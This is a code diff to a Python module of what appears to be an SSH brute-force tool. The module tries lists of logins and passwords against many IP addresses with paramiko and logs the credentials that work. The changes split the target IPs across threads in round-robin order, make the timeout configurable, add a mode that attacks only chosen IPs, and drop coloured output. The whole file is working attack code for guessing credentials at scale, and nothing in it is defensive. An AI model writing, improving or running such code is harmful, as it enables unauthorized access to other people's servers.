@@ -1,5 +1,4 @@
-from scripts.helpers import Threads, get_good_ips, prepare, show_brute_statistics
-from termcolor import colored
+from scripts.helpers import Threads, get_good_ips, prepare, show_brute_statistics, get_ips
 import paramiko
 import os
 
@@ -16,7 +15,7 @@ good_ips: list
 def execute(client: paramiko.SSHClient, command: str):
     return client.exec_command(command)
 
-def make_connection(ip: str, number: int, env):
+def make_connection(ip: str, number: int, env, ips: list):
     global current_creds, worked_ips, good_ips
     state = True
     for login in LOGINS:
@@ -25,7 +24,7 @@ def make_connection(ip: str, number: int, env):
                 if state:
                     current_creds[number] = [login, password]
                     
-                    show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips)
+                    show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips, ips, ENV)
                     
                     client = paramiko.SSHClient()
                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -35,7 +34,7 @@ def make_connection(ip: str, number: int, env):
                             port=int(env['PORT']),
                             username=login,
                             password=password,
-                            timeout=5
+                            timeout=int(env['TIMEOUT'])
                         )
                     except Exception as error:
                         with open(f'{env["OUTPUT_FOLDER"]}{env["FILENAME_ERRORS"]}', 'a') as errors:
@@ -62,47 +61,52 @@ def make_connection(ip: str, number: int, env):
                         break
                     client.close()
     worked_ips.append(ip)
-    show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips)
+    show_brute_statistics(current_work_ips, current_creds, worked_ips, good_ips, ips, ENV)
 
-def connect(ips: list, number: int, env):
+def connect(ips: list, job_resources: list, number: int, env):
     global current_work_ips
-    for ip in ips:
-        if type(ip) == list:
-            for one_ip in ip:
-                current_work_ips[number] = one_ip
-                make_connection(one_ip, number, env)
-        else:
-            current_work_ips[number] = ip
-            make_connection(one_ip, number, env)
+    i = 0
+    for ip in job_resources:
+        current_work_ips[number] = [ip, [i + 1, len(job_resources)]]
+        make_connection(ip, number, env, ips)
+        i += 1
 
-def start(env, arguments):
+def start(env, arguments, only: bool):
     global ENV, LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips
     LOGINS, PASSWORDS, threads, current_work_ips, current_creds, worked_ips, good_ips = prepare(env, arguments)
     ENV = env
     print('PREPARED TO WORK')
     print('CREATING IPS LIST')
-    ips = get_good_ips(env)
-    print(colored('[INFO] IPS LIST IS READY', 'green'))
-    print(colored('[INFO] STARTING CONNECTIONS...', 'green'))
-    print(colored('[INFO] PREPARED TO WORK', 'green'))
-    print(colored('[INFO] CREATING IPS LIST', 'green'))
-    print(colored('[INFO] IPS LIST IS READY', 'green'))
-    print(colored('[INFO] STARTING CONNECTIONS...', 'green'))
+    if only:
+        ips = get_ips(env, arguments)
+    else:
+        ips = get_good_ips(env)
+    print('[INFO] IPS LIST IS READY')
+    print('[INFO] STARTING CONNECTIONS...')
+    print('[INFO] PREPARED TO WORK')
+    print('[INFO] CREATING IPS LIST')
+    print('[INFO] IPS LIST IS READY')
+    print('[INFO] STARTING CONNECTIONS...')
     
-    start: int = 0
-    part: int = len(ips) // ENV["THREADS"]
-    end: int = part + ENV["THREADS"] - 1
+    jobs_resources = [[] for i in range(ENV["THREADS"])]
+
+    job_resource_id = 0
+    for ip in ips:
+        if job_resource_id == len(jobs_resources):
+            job_resource_id = 0
+        jobs_resources[job_resource_id].append(ip)
+        job_resource_id += 1
+
     for i in range(ENV['THREADS']):
-        threads.jobs.append([connect, [ips[start:end]], i, env])
-        start, end = end, end + part
-    
+        threads.jobs.append([connect, ips, jobs_resources[i], i, env])
+
     threads.run()
     
-    print(colored('CONNECTIONS ARE ENDED', 'green'))
-    print(colored('MAKING BACKUPS', 'green'))
+    print('CONNECTIONS ARE ENDED')
+    print('MAKING BACKUPS')
     os.system(f'cp {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS"]} {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS"]}.backup')
     os.system(f'cp {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]} {env["OUTPUT_FOLDER"]}{env["FILENAME_FOUND_IPS_EXTENDED"]}.backup')
     os.system(f'cp {env["OUTPUT_FOLDER"]}{env["FILENAME_ERRORS"]} {env["OUTPUT_FOLDER"]}{env["FILENAME_ERRORS"]}.backup')
 
 if __name__ == '__main__':
-    print(colored('[WARNING] PLEASE LAUNCH ssh_brute.py', 'red'))
+    print('[WARNING] PLEASE LAUNCH ssh_brute.py')
